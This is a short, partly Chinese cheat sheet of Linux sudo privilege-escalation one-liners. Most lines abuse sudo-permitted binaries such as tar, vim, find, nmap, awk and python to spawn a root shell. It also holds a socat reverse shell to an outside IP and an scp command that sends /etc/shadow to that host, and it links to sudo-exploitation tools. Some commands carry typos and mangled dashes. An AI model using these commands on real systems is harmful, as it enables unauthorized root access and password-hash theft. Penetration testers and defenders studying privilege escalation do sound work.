	>sudo -l  查看
	/home/user/.sudo_as_admin_successful
	>sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"
	>sudo tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash
	>sudo strace –o /dev/null /bin/bash
	>sudo nmap –interactive nmap>!sh
	>echo "os.execute('/bin.sh')">/tmp/1.nse
	>sudo nmap –script=/tmp/shell.nse 
	>sudo more/less/man /etc/rsyslog.conf  > !bash
	>sudo git help status 
	>!/bin/bash
	>sudo ftp
	>!/bin/bash
	>sudo vim -c '!sh'
	>sudo vi   > :!bash
	>sudo find /bin/ -name ls -exec /bin/bash ;
	>sudo find /home -exec /bin/bash \;
	>sudo awk 'BEGIN {system("/bin/sh")}'
	>sudo su
	>sudo bash
	>sudo perl -e 'exec "/bin/bash";'
	>sudo python -c 'import pty;pty.spawn("/bin/bash")'
	>sudo man man   > !bash
	>sudo /bin/script/asroot.sh
	>sudo env /bin/bash
	>sudo ftp
	>! /bin/bash
	>whoami
	>or
	>! /bin/sh
	>id
	>whoami
	>sudo socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.105:1234
	>sudo scp /etc/shadow aarti@192.168.1.105:~/

	工具
	https://github.com/TH3xACE/SUDO_KILLER
	sudo_inject
	https://github.com/nongiach/sudo_inject